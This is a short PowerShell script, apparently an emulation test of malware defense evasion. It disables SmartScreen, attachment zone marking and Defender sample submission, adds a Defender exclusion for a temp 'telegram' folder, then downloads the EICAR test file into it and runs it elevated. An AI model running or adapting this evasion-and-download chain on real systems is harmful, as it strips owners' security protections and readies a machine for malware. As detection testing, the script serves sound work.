New-Item "HKLM:\Software\Policies\Microsoft\Windows\System" -force | Out-Null
Set-ItemProperty -path "HKLM:\Software\Policies\Microsoft\Windows\System" -name "EnableSmartScreen" -value 0 -force 
New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" -force | Out-Null
Set-ItemProperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" -name "SaveZoneInformation" -value 1 -force 
New-Item "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -force |Out-Null
Set-ItemProperty -path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -name "SubmitSamplesConsent" -value 2 -force 

Set-MpPreference -SubmitSamplesConsent 2
New-Item -Path "$env:TEMP\telegram" -ItemType Directory | Out-Null
Add-MpPreference -ExclusionPath "$env:TEMP\telegram"
Invoke-WebRequest -Uri "https://secure.eicar.org/eicar.com.txt" -OutFile "$env:TEMP\telegram\eicar.com.txt" | Out-Null
Start-Process "$env:TEMP\telegram\eicar.com.txt" -Verb runas
